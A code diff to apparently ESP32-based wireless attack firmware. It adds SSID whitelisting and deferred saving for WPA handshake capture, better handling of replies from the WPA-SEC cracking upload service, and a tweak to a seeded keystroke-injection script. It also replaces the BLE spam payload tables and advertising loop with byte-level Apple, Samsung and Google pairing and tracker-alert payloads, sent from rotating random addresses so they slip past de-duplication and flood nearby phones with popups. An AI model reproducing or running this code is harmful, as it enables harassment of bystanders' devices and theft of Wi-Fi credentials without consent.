@@ -253,6 +253,7 @@ static int bt_device_count = 0;
 #define BLE_SPAM_MODE_AIRTAG      5
 #define BLE_SPAM_MODE_SMARTTAG    6
 #define BLE_SPAM_MODE_SOUR_APPLE  7
+#define BLE_SPAM_ADV_INSTANCE     1
 static volatile bool ble_spam_active = false;
 static TaskHandle_t ble_spam_task_handle = NULL;
 static lv_obj_t *ble_spam_status_label = NULL;
@@ -295,6 +296,7 @@ static lv_obj_t   *bd_speed_dd    = NULL;
 static lv_timer_t *bd_ui_timer    = NULL;
 
 // BLE Device Spoof state
+#define BLE_SPOOF_ADV_INSTANCE    2
 static volatile bool ble_spoof_active = false;
 static TaskHandle_t ble_spoof_task_handle = NULL;
 static lv_obj_t *ble_spoof_status_label = NULL;
@@ -740,13 +742,16 @@ static volatile bool scan_done_ui_flag = false;
 static volatile bool g_wcs_scan_active  = false;  /* WCS client scan owns SCAN_DONE — suppress attack flow */
 #define SCAN_RESULTS_MAX_DISPLAY 32
 
-// Whitelist for BSSID protection
+// Whitelist for BSSID and SSID protection
 #define MAX_WHITELISTED_BSSIDS 150
+#define MAX_WHITELISTED_SSIDS 50
 typedef struct {
     uint8_t bssid[6];
 } whitelisted_bssid_t;
 whitelisted_bssid_t whiteListedBssids[MAX_WHITELISTED_BSSIDS];
 int whitelistedBssidsCount = 0;
+EXT_RAM_BSS_ATTR static char whitelistedSsids[MAX_WHITELISTED_SSIDS][33];
+static int whitelistedSsidCount = 0;
 
 // ============================================================================
 // SD Card Cache in PSRAM
@@ -1000,6 +1005,7 @@ typedef struct {
     bool complete;
     bool beacon_captured;
     bool has_existing_file;
+    bool save_deferred;
     int64_t last_deauth_us;
     int64_t last_seen_us;
     int target_index;
@@ -4422,10 +4428,11 @@ static void sd_init_task(void *param)
 
 // Load whitelist from SD card
 void load_whitelist_from_sd(void) {
-    whitelistedBssidsCount = 0; // Reset count
-    
+    whitelistedBssidsCount = 0;
+    whitelistedSsidCount = 0;
+
     ESP_LOGI(TAG, "Loading whitelist from /sdcard/lab/white.txt...");
-    
+
     // Try to open the file - if SD not mounted, this will fail gracefully
     // Don't try to mount SD here - let it be mounted elsewhere
     FILE *file = fopen("/sdcard/lab/white.txt", "r");
@@ -4433,61 +4440,72 @@ void load_whitelist_from_sd(void) {
         ESP_LOGI(TAG, "white.txt not found or SD not accessible - whitelist will be empty");
         return;
     }
-    
-    ESP_LOGI(TAG, "Found white.txt, loading whitelisted BSSIDs...");
-    
+
+    ESP_LOGI(TAG, "Found white.txt, loading whitelisted BSSIDs and SSIDs...");
+
     char line[128];
     int line_number = 0;
-    int loaded_count = 0;
-    
-    while (fgets(line, sizeof(line), file) != NULL && whitelistedBssidsCount < MAX_WHITELISTED_BSSIDS) {
+    int bssid_count = 0, ssid_count = 0;
+
+    while (fgets(line, sizeof(line), file) != NULL) {
         line_number++;
-        
+
         // Remove trailing newline/whitespace
         line[strcspn(line, "\r\n")] = '\0';
-        
-        // Skip empty lines
-        if (strlen(line) == 0) {
+
+        // Skip leading whitespace
+        char *start = line;
+        while (*start == ' ' || *start == '\t') start++;
+
+        // Skip empty lines and comments
+        if (strlen(start) == 0 || *start == '#') {
             continue;
         }
-        
+
         // Parse BSSID in format: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX
         uint8_t bssid[6];
         int matches = 0;
-        
+
         // Try with colon separator
-        matches = sscanf(line, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+        matches = sscanf(start, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                         &bssid[0], &bssid[1], &bssid[2],
                         &bssid[3], &bssid[4], &bssid[5]);
-        
+
         // If that didn't work, try with dash separator
         if (matches != 6) {
-            matches = sscanf(line, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
+            matches = sscanf(start, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
                             &bssid[0], &bssid[1], &bssid[2],
                             &bssid[3], &bssid[4], &bssid[5]);
         }
-        
-        if (matches == 6) {
-            // Valid BSSID found, add to whitelist
+
+        if (matches == 6 && whitelistedBssidsCount < MAX_WHITELISTED_BSSIDS) {
+            // Valid BSSID found, add to BSSID whitelist
             memcpy(whiteListedBssids[whitelistedBssidsCount].bssid, bssid, 6);
             whitelistedBssidsCount++;
-            loaded_count++;
-            
-            ESP_LOGI(TAG, "  [%d] Loaded: %02X:%02X:%02X:%02X:%02X:%02X",
-                     loaded_count,
+            bssid_count++;
+
+            ESP_LOGI(TAG, "  [BSSID %d] Loaded: %02X:%02X:%02X:%02X:%02X:%02X",
+                     bssid_count,
                      bssid[0], bssid[1], bssid[2],
                      bssid[3], bssid[4], bssid[5]);
-        } else {
-            ESP_LOGI(TAG, "  Line %d: Invalid BSSID format, ignoring: %s", line_number, line);
+        } else if (matches != 6 && whitelistedSsidCount < MAX_WHITELISTED_SSIDS) {
+            // Not a valid BSSID, treat as SSID
+            strncpy(whitelistedSsids[whitelistedSsidCount], start, 32);
+            whitelistedSsids[whitelistedSsidCount][32] = '\0';
+            whitelistedSsidCount++;
+            ssid_count++;
+
+            ESP_LOGI(TAG, "  [SSID %d] Loaded: '%s'", ssid_count, start);
         }
     }
-    
+
     fclose(file);
-    
-    if (whitelistedBssidsCount > 0) {
-        ESP_LOGI(TAG, "Successfully loaded %d whitelisted BSSID(s)", whitelistedBssidsCount);
+
+    if (whitelistedBssidsCount > 0 || whitelistedSsidCount > 0) {
+        ESP_LOGI(TAG, "Successfully loaded %d BSSID(s) and %d SSID(s)",
+                 whitelistedBssidsCount, whitelistedSsidCount);
     } else {
-        ESP_LOGI(TAG, "No valid BSSIDs found in white.txt");
+        ESP_LOGI(TAG, "No valid entries found in white.txt");
     }
 }
 
@@ -4496,13 +4514,28 @@ bool is_bssid_whitelisted(const uint8_t *bssid) {
     if (bssid == NULL || whitelistedBssidsCount == 0) {
         return false;
     }
-    
+
     for (int i = 0; i < whitelistedBssidsCount; i++) {
         if (memcmp(bssid, whiteListedBssids[i].bssid, 6) == 0) {
             return true;
         }
     }
-    
+
+    return false;
+}
+
+// Check if an SSID is in the whitelist
+static bool is_ssid_whitelisted(const char *ssid) {
+    if (ssid == NULL || whitelistedSsidCount == 0) {
+        return false;
+    }
+
+    for (int i = 0; i < whitelistedSsidCount; i++) {
+        if (strcmp(ssid, whitelistedSsids[i]) == 0) {
+            return true;
+        }
+    }
+
     return false;
 }
 
@@ -5040,12 +5073,12 @@ static esp_err_t sd_cache_load_all(void) {
         ESP_LOGI(TAG, "  Handshakes: 0 (directory not found)");
     }
     
-    // 6. Load WPA-SEC API key from wpa-sec.txt
+    // 6. Load WPA-SEC API key from wpa-sec.txt (skip comment lines starting with #)
     sd_cache->wpasec_key[0] = '\0';
     file = fopen(WPASEC_KEY_PATH, "r");
     if (file != NULL) {
         char buf[WPASEC_KEY_MAX_LEN + 8];
-        if (fgets(buf, sizeof(buf), file) != NULL) {
+        while (fgets(buf, sizeof(buf), file) != NULL) {
             size_t len = strlen(buf);
             while (len > 0 && (buf[len - 1] == '\n' || buf[len - 1] == '\r' ||
                    buf[len - 1] == ' ' || buf[len - 1] == '\t')) {
@@ -5053,13 +5086,22 @@ static esp_err_t sd_cache_load_all(void) {
             }
             char *start = buf;
             while (*start == ' ' || *start == '\t') start++;
+            // Skip comment lines and empty lines
+            if (*start == '#' || strlen(start) == 0) {
+                continue;
+            }
             if (strlen(start) > 0 && strlen(start) < WPASEC_KEY_MAX_LEN) {
                 strncpy(sd_cache->wpasec_key, start, WPASEC_KEY_MAX_LEN - 1);
                 sd_cache->wpasec_key[WPASEC_KEY_MAX_LEN - 1] = '\0';
+                break;
             }
         }
         fclose(file);
-        ESP_LOGI(TAG, "  WPA-SEC key: %.4s****", sd_cache->wpasec_key);
+        if (sd_cache->wpasec_key[0] != '\0') {
+            ESP_LOGI(TAG, "  WPA-SEC key: %.4s****", sd_cache->wpasec_key);
+        } else {
+            ESP_LOGI(TAG, "  WPA-SEC key: not found");
+        }
     } else {
         ESP_LOGI(TAG, "  WPA-SEC key: not found");
     }
@@ -9579,6 +9621,10 @@ static void hs_sniffer_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t typ
                 offset += 2 + tag_len;
             }
             if (authmode != WIFI_AUTH_OPEN) {
+                // Skip whitelisted APs (by BSSID or SSID)
+                if (is_bssid_whitelisted(ap_bssid) || is_ssid_whitelisted(ssid)) {
+                    return;
+                }
                 int ap_idx = hs_add_or_update_ap(ap_bssid, ssid, beacon_channel, authmode, pkt->rx_ctrl.rssi);
                 if (ap_idx >= 0 && !hs_ap_targets[ap_idx].beacon_captured &&
                     !hs_ap_targets[ap_idx].has_existing_file && !hs_ap_targets[ap_idx].complete) {
@@ -9595,6 +9641,13 @@ static void hs_sniffer_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t typ
             int ap_idx = hs_find_ap(ap_mac);
             if (ap_idx >= 0 && !hs_ap_targets[ap_idx].has_existing_file && !hs_ap_targets[ap_idx].complete) {
                 hs_add_or_update_client(client_mac, ap_idx, pkt->rx_ctrl.rssi);
+                pcap_serializer_append_frame(frame, len, pkt->rx_ctrl.timestamp);
+            }
+        } else if (frame_type == 0x10) {
+            uint8_t *ap_mac = addr2;
+            int ap_idx = hs_find_ap(ap_mac);
+            if (ap_idx >= 0 && !hs_ap_targets[ap_idx].has_existing_file && !hs_ap_targets[ap_idx].complete) {
+                pcap_serializer_append_frame(frame, len, pkt->rx_ctrl.timestamp);
             }
         }
         return;
@@ -10330,7 +10383,7 @@ static void handshake_attack_task_selected(void) {
                 }
             }
 
-            if (ap_idx >= 0 && hs_ap_targets[ap_idx].complete) {
+            if (ap_idx >= 0 && hs_ap_targets[ap_idx].complete && !hs_ap_targets[ap_idx].save_deferred) {
                 ESP_LOGI(TAG, "Saving handshake for '%s'...", target_ap->ssid);
                 if (hs_save_handshake_to_sd(ap_idx)) {
                     hs_ap_targets[ap_idx].has_existing_file = true;
@@ -10340,6 +10393,9 @@ static void handshake_attack_task_selected(void) {
                     ESP_LOGI(TAG, "Handshake #%d captured and saved!", hs_total_handshakes_captured);
                     pcap_serializer_init();
                     hs_ui_update_flag = true;
+                } else {
+                    hs_ap_targets[ap_idx].save_deferred = true;
+                    ESP_LOGW(TAG, "[HS] Save deferred for '%s' — will retry after attack stops", target_ap->ssid);
                 }
             }
         }
@@ -10353,6 +10409,21 @@ static void handshake_attack_task_selected(void) {
     }
 
     esp_wifi_set_promiscuous(false);
+
+    // Final save pass: switch to STA mode to free APSTA DMA, then save deferred handshakes
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    vTaskDelay(pdMS_TO_TICKS(150));
+
+    for (int a = 0; a < hs_ap_count; a++) {
+        hs_ap_target_t *ap = &hs_ap_targets[a];
+        if (!ap->complete || ap->has_existing_file) continue;
+        if (hs_save_handshake_to_sd(a)) {
+            ap->has_existing_file = true;
+            hs_total_handshakes_captured++;
+            ESP_LOGI(TAG, "[HS-FINAL] Saved deferred handshake for '%s'", ap->ssid);
+        }
+    }
+
     pcap_serializer_deinit();
 }
 
@@ -10511,7 +10582,7 @@ static void handshake_attack_task_sniffer(void) {
 
         for (int a = 0; a < hs_ap_count; a++) {
             hs_ap_target_t *ap = &hs_ap_targets[a];
-            if (!ap->complete || ap->has_existing_file) continue;
+            if (!ap->complete || ap->has_existing_file || ap->save_deferred) continue;
 
             ESP_LOGI(TAG, "Saving complete handshake for '%s'...", ap->ssid);
             if (hs_save_handshake_to_sd(a)) {
@@ -10526,6 +10597,9 @@ static void handshake_attack_task_sniffer(void) {
                         hs_ap_targets[j].beacon_captured = false;
                     }
                 }
+            } else {
+                ap->save_deferred = true;
+                ESP_LOGW(TAG, "[HS] Save deferred for '%s' — will retry after sniffer stops", ap->ssid);
             }
         }
 
@@ -10543,6 +10617,21 @@ static void handshake_attack_task_sniffer(void) {
     }
 
     esp_wifi_set_promiscuous(false);
+
+    // Final save pass: switch to STA mode to free APSTA DMA, then save deferred handshakes
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    vTaskDelay(pdMS_TO_TICKS(150));
+
+    for (int a = 0; a < hs_ap_count; a++) {
+        hs_ap_target_t *ap = &hs_ap_targets[a];
+        if (!ap->complete || ap->has_existing_file) continue;
+        if (hs_save_handshake_to_sd(a)) {
+            ap->has_existing_file = true;
+            hs_total_handshakes_captured++;
+            ESP_LOGI(TAG, "[HS-FINAL] Saved deferred handshake for '%s'", ap->ssid);
+        }
+    }
+
     pcap_serializer_deinit();
 }
 
@@ -16370,11 +16459,17 @@ static int wpasec_upload_file(const char *filepath, const char *filename)
         return -1;
     }
 
-    // Read response
-    char resp_buf[512] = {0};
+    // Read response into larger PSRAM buffer (2 KB)
+    char *resp_buf = (char *)heap_caps_malloc(2048, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
+    if (!resp_buf) {
+        ESP_LOGW(TAG, "WPA-SEC: Failed to allocate response buffer");
+        esp_tls_conn_destroy(tls);
+        return -1;
+    }
+
     int total_read = 0;
-    while (total_read < (int)sizeof(resp_buf) - 1) {
-        ret = esp_tls_conn_read(tls, resp_buf + total_read, sizeof(resp_buf) - 1 - total_read);
+    while (total_read < 2047) {
+        ret = esp_tls_conn_read(tls, (uint8_t *)resp_buf + total_read, 2047 - total_read);
         if (ret <= 0) break;
         total_read += ret;
     }
@@ -16389,15 +16484,36 @@ static int wpasec_upload_file(const char *filepath, const char *filename)
         if (sp) status = atoi(sp + 1);
     }
 
+    // Find HTTP body after \r\n\r\n
+    const char *body_ptr = strstr(resp_buf, "\r\n\r\n");
+    if (body_ptr) {
+        body_ptr += 4;
+    } else {
+        body_ptr = "";
+    }
+
+    // Skip chunked encoding size line if present (starts with hex digits then \r\n)
+    if (body_ptr && strstr(resp_buf, "chunked")) {
+        const char *nl = strchr(body_ptr, '\n');
+        if (nl) body_ptr = nl + 1;
+    }
+
+    int result = -1;
     if (status == 200) {
-        if (strstr(resp_buf, "already submitted") != NULL) {
-            return 1; // duplicate
+        if (strstr(body_ptr, "already submitted") != NULL) {
+            result = 1; // duplicate
+        } else if (strstr(body_ptr, "Bad capture") != NULL || strstr(body_ptr, "invalid") != NULL) {
+            result = -1; // bad capture
+        } else {
+            result = 0; // success
         }
-        return 0; // success
     } else {
         ESP_LOGW(TAG, "WPA-SEC: HTTP error %d", status);
-        return -1;
+        result = -1;
     }
+
+    heap_caps_free(resp_buf);
+    return result;
 }
 
 /**
@@ -21993,7 +22109,7 @@ static const char SEED_RICKROLL_DUCK[] =
     "\n"
     "REM Open default browser (Win+B)\n"
     "GUI b\n"
-    "DELAY 2500\n"
+    "DELAY 4000\n"
     "\n"
     "REM Focus address bar\n"
     "CTRL l\n"
@@ -29264,51 +29380,54 @@ static void show_stub_screen(const char *name, void (*back_fn)(void))
 // ── BLE Spam payload tables ──────────────────────────────────────────────────
 // Apple Proximity Pairing: company ID 0x004C, type 0x10, len 0x05
 // Each payload triggers a pairing popup on nearby iOS devices
-static const uint8_t s_apple_payloads[][10] = {
-    {0x4C,0x00,0x10,0x05,0x01,0x18,0x75,0x55,0x01,0x00}, // AirPods
-    {0x4C,0x00,0x10,0x05,0x02,0x18,0x75,0x55,0x01,0x00}, // PowerBeats
-    {0x4C,0x00,0x10,0x05,0x03,0x18,0x75,0x55,0x01,0x00}, // PowerBeats Pro
-    {0x4C,0x00,0x10,0x05,0x05,0x18,0x75,0x55,0x01,0x00}, // AirPods 3rd Gen
-    {0x4C,0x00,0x10,0x05,0x06,0x18,0x75,0x55,0x02,0x00}, // AirPods 3rd Gen case
-    {0x4C,0x00,0x10,0x05,0x09,0x18,0x75,0x55,0x01,0x00}, // AirPods Pro
-    {0x4C,0x00,0x10,0x05,0x0A,0x18,0x75,0x55,0x01,0x00}, // AirPods Pro 2
-    {0x4C,0x00,0x10,0x05,0x0B,0x18,0x75,0x55,0x01,0x00}, // AirPods Max
-    {0x4C,0x00,0x10,0x05,0x0C,0x18,0x75,0x55,0x01,0x00}, // Beats Solo Pro
-    {0x4C,0x00,0x10,0x05,0x0D,0x18,0x75,0x55,0x01,0x00}, // Beats Studio Buds
-    {0x4C,0x00,0x10,0x05,0x0E,0x18,0x75,0x55,0x01,0x00}, // Beats Flex
-    {0x4C,0x00,0x10,0x05,0x0F,0x18,0x75,0x55,0x01,0x00}, // BeatsX
-    {0x4C,0x00,0x10,0x05,0x11,0x18,0x75,0x55,0x01,0x00}, // Beats Studio Buds+
+// Apple Proximity Pairing (0x07,0x19,0x07) — triggers "Connect AirPods" popup on iPhone
+// Format: 0x4C,0x00, 0x07,0x19,0x07, <device_type>, 0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,
+//         0x12,0x12,0x12,0x00, [padding to 24 bytes]
+static const uint8_t s_apple_payloads[][24] = {
+    {0x4C,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, // AirPods (1st)
+    {0x4C,0x00,0x07,0x19,0x07,0x03,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, // PowerBeats
+    {0x4C,0x00,0x07,0x19,0x07,0x0B,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, // PowerBeats Pro
+    {0x4C,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, // AirPods Gen3
+    {0x4C,0x00,0x07,0x19,0x07,0x0E,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, // AirPods Pro (1st)
+    {0x4C,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, // AirPods Pro Gen2
+    {0x4C,0x00,0x07,0x19,0x07,0x0A,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, // AirPods Max
+    {0x4C,0x00,0x07,0x19,0x07,0x0C,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, // Beats Solo Pro
+    {0x4C,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, // Beats Studio Buds
+    {0x4C,0x00,0x07,0x19,0x07,0x10,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, // Beats Flex
+    {0x4C,0x00,0x07,0x19,0x07,0x05,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, // BeatsX
+    {0x4C,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, // Beats Studio Buds+
 };
 #define APPLE_PAYLOAD_COUNT (int)(sizeof(s_apple_payloads)/sizeof(s_apple_payloads[0]))
 
-// Samsung Galaxy Buds fast-connect (company ID 0x0075)
-// Last byte selects device model — triggers "Connect to <device>" popup on Samsung phones
-static const uint8_t s_samsung_payloads[][10] = {
-    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21}, // Galaxy Buds Pro  (SM-R190)
-    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0xA7}, // Galaxy Buds Live (SM-R180)
-    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x33}, // Galaxy Buds2     (SM-R177)
-    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x09}, // Galaxy Buds+     (SM-R175)
-    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x46}, // Galaxy Buds2 Pro (SM-R510)
-    {0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x63}, // Galaxy Buds FE   (SM-R400)
-};
-#define SAMSUNG_PAYLOAD_COUNT (int)(sizeof(s_samsung_payloads)/sizeof(s_samsung_payloads[0]))
+// Apple Nearby Action (0x04,0x04,0x2A) — triggers "Setup New Apple TV?", "Transfer Number?" popups
+// Format: 0x4C,0x00, 0x04,0x04,0x2A, <action_byte>, 0x60,0x4C,0x95,0x00,0x00,0x10,0x00,0x00,0x00
+// Last 3 bytes randomized per cycle; action_byte rotates through list
+static const uint8_t s_apple_nearby_actions[] = {0x27,0x09,0x02,0x1e,0x2b,0x2d,0x2f,0x01,0x06,0x20,0xc0};
+#define APPLE_NEARBY_ACTION_COUNT (int)(sizeof(s_apple_nearby_actions)/sizeof(s_apple_nearby_actions[0]))
 
-// Google Fast Pair — service data UUID 0xFE2C (little-endian) + 3-byte model ID
-// Format: [0x2C 0xFE model_byte0 model_byte1 model_byte2]
-// Model IDs are 3-byte big-endian values registered with Google's Fast Pair registry
-static const uint8_t s_google_fp_payloads[][5] = {
-    {0x2C,0xFE, 0x2D,0x7A,0x23}, // Pixel Buds A-Series
-    {0x2C,0xFE, 0x71,0x8F,0xA4}, // JBL Live 300TWS
-    {0x2C,0xFE, 0xCD,0x82,0x56}, // Bose NC 700
-    {0x2C,0xFE, 0xD4,0x46,0xA7}, // Sony WH-1000XM5
-    {0x2C,0xFE, 0x07,0xF4,0x26}, // Google Nest Hub Max
-    {0x2C,0xFE, 0xF5,0x24,0x94}, // JBL Buds Pro
-    {0x2C,0xFE, 0x82,0x1F,0x66}, // JBL Flip 6
-    {0x2C,0xFE, 0x02,0xDD,0x4F}, // JBL Tune 770NC
-    {0x2C,0xFE, 0x17,0x53,0x5E}, // Sony WH-1000XM5 (alt)
-    {0x2C,0xFE, 0xF0,0x00,0x00}, // Bose QuietComfort 35 II
-    {0x2C,0xFE, 0x06,0x00,0x00}, // Pixel Buds (1st gen)
-    {0x2C,0xFE, 0x92,0xBB,0xBD}, // Pixel Buds (variant)
+// Samsung Galaxy Watch (company ID 0x0075) — triggers "Unknown Tracker" alert on Samsung phones
+// Format: 0x75,0x00, 0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43, <watch_model>
+// Base payload (model byte randomized per cycle); MAC also randomized to defeat de-dupe
+static const uint8_t s_samsung_base_payload[] = {0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43};
+static const uint8_t s_samsung_models[] = {
+    0x1A,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,
+    0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x1B,0x1C,0x1D,0x1E,0x20
+};
+#define SAMSUNG_MODEL_COUNT (int)(sizeof(s_samsung_models)/sizeof(s_samsung_models[0]))
+
+// Google Fast Pair — service data UUID 0xFE2C + model ID (3 bytes) + TX power (0x02,0x0A,<tx_power>)
+// Format: [0x2C,0xFE, model0, model1, model2, 0x02, 0x0A, tx_power]
+// TX power varies per cycle; these are seed values randomized at runtime
+static const uint8_t s_google_fp_payloads[][8] = {
+    {0x2C,0xFE, 0x2D,0x7A,0x23, 0x02,0x0A,0xC8}, // Pixel Buds A-Series
+    {0x2C,0xFE, 0x71,0x8F,0xA4, 0x02,0x0A,0xC5}, // JBL Live 300TWS
+    {0x2C,0xFE, 0xCD,0x82,0x56, 0x02,0x0A,0xCA}, // Bose NC 700
+    {0x2C,0xFE, 0xD4,0x46,0xA7, 0x02,0x0A,0xC9}, // Sony WH-1000XM5
+    {0x2C,0xFE, 0x07,0xF4,0x26, 0x02,0x0A,0xC7}, // Google Nest Hub Max
+    {0x2C,0xFE, 0xF5,0x24,0x94, 0x02,0x0A,0xC6}, // JBL Buds Pro
+    {0x2C,0xFE, 0x82,0x1F,0x66, 0x02,0x0A,0xCB}, // JBL Flip 6
+    {0x2C,0xFE, 0xF0,0x00,0x00, 0x02,0x0A,0xC8}, // Universal / debug ID
+    {0x2C,0xFE, 0x06,0x00,0x00, 0x02,0x0A,0xC4}, // Pixel Buds (1st gen)
 };
 #define GOOGLE_PAYLOAD_COUNT (int)(sizeof(s_google_fp_payloads)/sizeof(s_google_fp_payloads[0]))
 
@@ -29366,148 +29485,316 @@ static void ble_disc_proceed_from_sas(void)
     show_ble_disc_directed_screen();
 }
 
-// ── BLE Spam task ─────────────────────────────────────────────────────────────
-static void ble_spam_task(void *pvParameters)
+// ── BLE Spam state (for LVGL timer) ───────────────────────────────────────────
+struct ble_spam_state_t {
+    int apple_idx, samsung_idx, google_idx, windows_idx;
+    int airtag_idx, smarttag_idx, sour_apple_idx;
+    int apple_nearby_action_idx;
+    int apple_packet_cycle;  // 0 = pairing, 1 = nearby action (alternates)
+    int mode_round;
+    bool configured;
+    bool started;
+    lv_timer_t *timer;
+    // Samsung burst optimization: hold MAC stable for 4 packets so Samsung detects a real device
+    ble_addr_t samsung_burst_mac;
+    int samsung_burst_count;  // 0-3: in burst, 4+: move to next mode
+} g_ble_spam_state = {0};
+
+// ── BLE Spam timer callback (called by LVGL every 100ms) ────────────────────────
+static void ble_spam_timer_cb(lv_timer_t *timer)
 {
-    (void)pvParameters;
-    int apple_idx = 0, samsung_idx = 0, google_idx = 0, windows_idx = 0;
-    int airtag_idx = 0, smarttag_idx = 0, sour_apple_idx = 0;
-    int mode_round = 0; // cycles through modes when ALL
+    (void)timer;
+    if (!ble_spam_active) return;
 
-    while (ble_spam_active) {
-        // Rotate random address each cycle so scanners see a new device every packet.
-        // Without this every advertisement comes from the same MAC and nRF Connect
-        // updates the same row instead of showing a new device.
-        ble_addr_t rnd_addr;
-        if (ble_hs_id_gen_rnd(1, &rnd_addr) == 0)
-            ble_hs_id_set_rnd(rnd_addr.val);
+    struct ble_spam_state_t *st = &g_ble_spam_state;
 
-        ble_gap_adv_stop();
-        // Brief yield so NimBLE host task can process the stop event and free
-        // internal advertising resources before we set new fields. Without this
-        // the mbuf pool and event queue drain slowly until ~1400 cycles in the
-        // host asserts / watchdog fires.
-        vTaskDelay(pdMS_TO_TICKS(10));
+    // Configure on first callback
+    if (!st->configured) {
+        struct ble_gap_ext_adv_params ext_adv_params;
+        memset(&ext_adv_params, 0, sizeof(ext_adv_params));
+        ext_adv_params.connectable = 0;
+        ext_adv_params.scannable = 0;
+        ext_adv_params.legacy_pdu = 1;
+        ext_adv_params.own_addr_type = BLE_OWN_ADDR_RANDOM;
+        ext_adv_params.primary_phy = BLE_HCI_LE_PHY_1M;
+        ext_adv_params.secondary_phy = BLE_HCI_LE_PHY_1M;
+        ext_adv_params.itvl_min = BLE_GAP_ADV_ITVL_MS(100);
+        ext_adv_params.itvl_max = BLE_GAP_ADV_ITVL_MS(150);
+        ext_adv_params.sid = BLE_SPAM_ADV_INSTANCE;
 
-        struct ble_hs_adv_fields fields;
-        memset(&fields, 0, sizeof(fields));
-        fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
+        ESP_LOGI(TAG, "[SPAM] timer: configuring instance %d (connectable=%d, scannable=%d, legacy_pdu=%d, own_addr_type=%d)",
+                 BLE_SPAM_ADV_INSTANCE, ext_adv_params.connectable, ext_adv_params.scannable,
+                 ext_adv_params.legacy_pdu, ext_adv_params.own_addr_type);
 
-        int cur_mode = ble_spam_mode;
-        if (cur_mode == BLE_SPAM_MODE_ALL) {
-            static const int all_modes[] = {
-                BLE_SPAM_MODE_APPLE, BLE_SPAM_MODE_SAMSUNG,
-                BLE_SPAM_MODE_GOOGLE, BLE_SPAM_MODE_WINDOWS,
-                BLE_SPAM_MODE_AIRTAG, BLE_SPAM_MODE_SMARTTAG,
-                BLE_SPAM_MODE_SOUR_APPLE
-            };
-            cur_mode = all_modes[mode_round % 7];
-            mode_round++;
+        int rc = ble_gap_ext_adv_configure(BLE_SPAM_ADV_INSTANCE, &ext_adv_params, NULL, NULL, NULL);
+        ESP_LOGI(TAG, "[SPAM] configure() returned %d", rc);
+        if (rc != 0) {
+            ESP_LOGE(TAG, "[SPAM] configure FAILED: %d — instance state invalid", rc);
+            ble_spam_active = false;
+            return;
         }
 
-        bool use_svc = false;
-        const uint8_t *svc_data = NULL;
-        uint8_t svc_data_len = 0;
-        uint8_t at_mfg[29]; // AirTag Find My manufacturer data buffer
-        uint8_t sa_mfg[9];  // Sour Apple Nearby Action buffer
-
-        switch (cur_mode) {
-        case BLE_SPAM_MODE_APPLE:
-            fields.mfg_data = s_apple_payloads[apple_idx];
-            fields.mfg_data_len = sizeof(s_apple_payloads[0]);
-            apple_idx = (apple_idx + 1) % APPLE_PAYLOAD_COUNT;
-            break;
-        case BLE_SPAM_MODE_SAMSUNG:
-            fields.mfg_data = s_samsung_payloads[samsung_idx];
-            fields.mfg_data_len = sizeof(s_samsung_payloads[0]);
-            samsung_idx = (samsung_idx + 1) % SAMSUNG_PAYLOAD_COUNT;
-            break;
-        case BLE_SPAM_MODE_GOOGLE:
-            use_svc = true;
-            svc_data = s_google_fp_payloads[google_idx];
-            svc_data_len = sizeof(s_google_fp_payloads[0]);
-            google_idx = (google_idx + 1) % GOOGLE_PAYLOAD_COUNT;
-            break;
-        case BLE_SPAM_MODE_AIRTAG: {
